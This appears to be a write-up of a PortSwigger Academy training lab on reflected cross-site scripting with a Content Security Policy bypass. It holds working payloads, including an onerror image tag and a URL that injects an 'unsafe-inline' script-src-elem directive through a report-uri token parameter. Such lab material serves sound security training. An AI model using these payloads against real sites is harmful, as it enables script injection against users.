# Lab: Reflected XSS protected by CSP, with CSP bypass

**Official lab:** [https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)

## Lab idea

The challenge combines reflected XSS with a Content Security Policy (CSP) that is intended to restrict script execution. It practices assessing how browser policy affects exploitability and why a policy must be treated as a mitigation rather than a substitute for fixing unsafe handling.

## Vulnerability in brief
Cross-site scripting (XSS) is a web security vulnerability in which an application causes attacker-controlled content to be interpreted as executable script in a user’s browser. The code runs in the vulnerable site’s origin, so it can interfere with the victim’s interaction with that application and may access data or perform actions available to that user.

## Solution idea
1. Enter the following into the search box: <img src=1 onerror=alert(1)>
2. Observe that the payload is reflected, but the CSP prevents the script from executing.
3. In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token .
4. Visit the following URL, replacing YOUR-LAB-ID with your lab ID…

## Payloads / key values
- `<img src=1 onerror=alert(1)>`
- `Content-Security-Policy`
- `report-uri`
- `token`
- `YOUR-LAB-ID`
- `https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27`
- `script-src-elem`
- `script`
- `script-src`
- `unsafe-inline`

## Official source
- [PortSwigger Academy: Lab: Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass)
